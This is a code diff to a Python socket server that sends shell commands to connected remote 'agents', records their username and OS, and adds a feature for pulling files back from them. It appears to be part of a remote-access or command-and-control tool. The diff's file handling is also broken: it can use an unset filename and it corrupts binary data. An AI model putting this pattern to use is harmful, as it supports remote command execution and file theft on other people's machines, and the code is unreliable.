@@ -129,9 +129,13 @@ class AgentHandler(threading.Thread):
                     file_data = file.read()
                     self.agent_socket.sendall(file_data)
                     cache.set('command_data', {})
+                elif command and command.startswith("DOWNLOAD:"):
+                    file_name = command[len("DOWNLOAD:"):]
+                    self.agent_socket.send(command.encode("utf-8"))
+                    cache.set('command_data', {})
                 elif command:
                     marked_command = f"CMD:{command}"
-                    self.agent_socket.send(marked_command.encode("utf-8"))
+                    self.agent_socket.send(marked_command.encode())
                     cache.set('command_data', {})
 
                     if command.lower() == "exit":
@@ -139,9 +143,15 @@ class AgentHandler(threading.Thread):
                         send_command_response_to_group()
                         break
 
-                response = self.agent_socket.recv(4096).decode("utf-8")
-
+                response = self.agent_socket.recv(4096).decode()
                 responses_dict = cache.get('command_responses', {})
+
+                if response.startswith("FILE:"):
+                    file_data = response[len("FILE:"):]
+                    with open(file_name, "wb") as f:
+                        f.write(file_data.encode())
+                    response = "File downloaded successfully"
+
                 responses_dict[self.agent_id] = response
                 cache.set('command_responses', responses_dict)
                 send_command_response_to_group()
@@ -169,8 +179,8 @@ def main():
         while True:
             agent_socket, agent_address = server_socket.accept()
             agent_handler = AgentHandler(agent_socket, agent_address)
-            username = agent_socket.recv(4096).decode("utf-8")
-            client_os = agent_socket.recv(4096).decode("utf-8")
+            username = agent_socket.recv(4096).decode()
+            client_os = agent_socket.recv(4096).decode()
             agent_handler.start()
             # Add the client to the list
             add_client(agent_handler.agent_id,
